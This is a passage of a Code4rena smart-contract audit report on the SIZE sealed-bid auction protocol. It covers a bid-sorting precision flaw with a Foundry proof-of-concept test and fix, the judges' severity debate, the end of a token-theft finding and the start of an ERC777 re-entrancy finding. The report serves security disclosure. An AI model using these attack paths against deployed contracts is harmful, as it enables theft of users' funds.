away with all her base tokens and <code>1000e18</code> Q tokens that are Bob’s. Alice has stolen Bob’s funds.</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider using OpenZeppelin’s SafeERC20 instead, which has checks that an address does indeed have a contract.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/318#issuecomment-1319229833\">Ragepit (SIZE) confirmed and commented on duplicate issue #318</a>:</strong></p>\n<blockquote>\n<p>Incredibly unlikely but confirming as Medium given the good argument in <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/48\">#48</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-the-sorting-logic-is-not-strict-enough\" style=\"position:relative;\"><a href=\"#m-03-the-sorting-logic-is-not-strict-enough\" aria-label=\"m 03 the sorting logic is not strict enough permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/97\">[M-03] The sorting logic is not strict enough</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/97\">hansfriese</a></em></p>\n<p>When the seller finalizes his auction, all bids are sorted according to the <code>quotePerBase</code> and it’s calculated using the <code>FixedPointMathLib.mulDivDown()</code>.</p>\n<p>And the earliest bid will be used first for the same <code>quotePerBase</code> but this ratio is not strict enough so that the worse bid might be filled than the better one.</p>\n<p>As a result, the seller might receive fewer quote token than he wants.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is the test to show the scenario.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testAuditWrongSorting</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// this test will show that it is possible the seller can not claim the best bid because of the inaccurate comparison in finalization</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">K</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">&lt;&lt;</span><span class=\"mtk7\">64</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">baseToSell</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">K</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">aid</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">seller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createAuction</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">baseToSell</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reserveQuotePerBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minimumBidQuote</span><span class=\"mtk1\">, </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">, </span><span class=\"mtk12\">endTime</span><span class=\"mtk1\">, </span><span class=\"mtk12\">unlockTime</span><span class=\"mtk1\">, </span><span class=\"mtk12\">unlockEnd</span><span class=\"mtk1\">, </span><span class=\"mtk12\">cliffPercent</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setAuctionId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">aid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bidOnAuctionWithSalt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">K</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">K</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Worse bidder&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidder2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setAuctionId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">aid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidder2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bidOnAuctionWithSalt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">K</span><span class=\"mtk1\">+</span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">K</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Better bidder&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// This is the better bid because (K+1)/(K+2) &gt; K/(K+1)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">endTime</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// the seller is smart enough to choose the correct order to (1, 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ISizeSealed</span><span class=\"mtk1\">.</span><span class=\"mtk12\">InvalidSorting</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">seller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">finalize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">, </span><span class=\"mtk12\">K</span><span class=\"mtk1\">+</span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">K</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// this reverts because of #273</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// next the seller is forced to call the finalize with parameter K+1, K preferring the first bidder</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">seller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">finalize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">, </span><span class=\"mtk12\">K</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">K</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// at this point the seller gets K quote tokens while he could get K+1 quote tokens with the better bidder</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">seller</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">K</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>This is the output of the test.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Running</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">test</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SizeSealed</span><span class=\"mtk1\">.</span><span class=\"mtk12\">t</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk12\">SizeSealedTest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    [</span><span class=\"mtk12\">PASS</span><span class=\"mtk1\">] </span><span class=\"mtk11\">testAuditWrongSorting</span><span class=\"mtk1\">() (</span><span class=\"mtk12\">gas</span><span class=\"mtk1\">: </span><span class=\"mtk7\">984991</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    Test result: ok. 1 passed; 0 failed; finished in 7.22ms</span></span></span></code></pre>\n<p>When it calculates the <a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269\">quotePerBase</a>, they are same each other with <code>(base, quote) = (K+1, K) and (K+2, K+1) when K = 1&#x3C;&#x3C;64</code>.</p>\n<p>So the seller can receive <code>K+1</code> of the quote token but he got <code>K</code>.</p>\n<p>I think <code>K</code> is realistic enough with the 18 decimals token because K is around 18 * 1e18.</p>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>As we can see from the test, it’s not strict enough to compare bidders using <code>quotePerBase</code>.</p>\n<p>We can compare them by multiplying them like below.</p>\n<p>$\\frac {quote1}{base1} >= \\frac{quote2}{base2} <=> quote1 &ast; base2 >= quote2 &ast; base1$</p>\n<p>So we can add 2 elements to <code>FinalizeData</code> struct and modify <a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269-L277\">this comparison</a> like below.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FinalizeData</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reserveQuotePerBase</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalBaseAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">filledBase</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">previousQuotePerBase</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">previousIndex</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">previousQuote</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//++++++++++++</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">previousBase</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//+++++++++++</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quotePerBase</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">FixedPointMathLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">, </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">, </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">quotePerBase</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">previousQuotePerBase</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// If last bid was the same price, make sure we filled the earliest bid first</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">quotePerBase</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">previousQuotePerBase</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentMult</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">previousBase</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//mult for current bid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">previousMult</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">previousQuote</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//mult for the previous bid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">currentMult</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">previousMult</span><span class=\"mtk1\">) { </span><span class=\"mtk3\">// current bid is better</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidSorting</span><span class=\"mtk1\">();    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">currentMult</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">previousMult</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">previousIndex</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">bidIndex</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidSorting</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidSorting</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">previousBase</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">previousQuote</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/97#issuecomment-1309172738\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>hmmm…  I think the summary is loss of precision leads to small difference in sorting.  Will leave open for sponsor review, but may be QA without showing a larger impact </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/97#issuecomment-1321318749\">RagePit (SIZE) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>very nice find, although its only a small loss in precision the possibility of unfair sorting should be addressed</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/97#issuecomment-1329859282\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>With 1e18 points of precision, the difference between the theoretically correct calculation and the actual calculation is basically non existent. Therefore, impact is purely theoretical, as a competitive bidder could by the same logic over-bid by a tiny amount in the corrected calculation as well.\nAlso, it is worth remembering that quote1 &#x26; quote2 are unknown until revealed, when it’s too late to over-bid.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/97#issuecomment-1330084026\">hansfriese (warden) commented</a>:</strong></p>\n<blockquote>\n<p>The definition of a better bid is the seller can earn more quote tokens (even if it’s 1 wei) by using the bidder.\nAs we can see from the test, the seller can receive more amount of quote tokens if he uses the worse bidder.\nIt means the sorting method using 1e18 is not good enough.\nIf we implement the suggested comparison method(quote1 * base2 > quote2 * base1), it’s impossible to receive more funds by using the worse bidder because the comparison is strict.\nThis issue has no relation to the over-bid and just shows the incorrect sorting logic.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/97#issuecomment-1330152376\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Yeah Hans you are very much correct in that sorting logic can theoretically be incorrect. I’m talking about the impact, not the root cause. Don’t you agree that the difference in calculation and the fact quote is unknown makes impact completely nullified?</p>\n<p>Regardless it’s a well a spotted sneaky bug.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/97#issuecomment-1330163540\">hansfriese (warden) commented</a>:</strong></p>\n<blockquote>\n<p>I think we can’t say it’s 100% impossible to have the above situation although the bidders place a bid without knowing others.</p>\n<p>It says about the Med risk like below in the document.</p>\n<p>2 - Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.</p>\n<p>I think my test case would be a possible assumption.</p>\n<p>I feel I am defending my issue too much. I won’t reply anymore and will follow the judge’s decision.</p>\n<p>Thanks for your feedback.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/97#issuecomment-1335304455\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Thanks for the comments and fact based discussion which is always welcomed, going to move forward with a M here. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-auction-created-by-erc777-tokens-with-tax-can-be-stolen-by-re-entrancy-attack\" style=\"position:relative;\"><a href=\"#m-04-auction-created-by-erc777-tokens-with-tax-can-be-stolen-by-re-entrancy-attack\" aria-label=\"m 04 auction created by erc777 tokens with tax can be stolen by re entrancy attack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/192\">[M-04] Auction created by ERC777 Tokens with tax can be stolen by re-entrancy attack</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/192\">ronnyx2017</a></em></p>\n<p>The createAuction function lacks the check of re-entrancy. An attacker can use an ERC777 token with tax as the base token to create auctions. By registering ERC777TokensSender interface implementer in the ERC1820Registry contract, the attacker can re-enter the createAuction function and create more than one auction with less token. And the sum of the 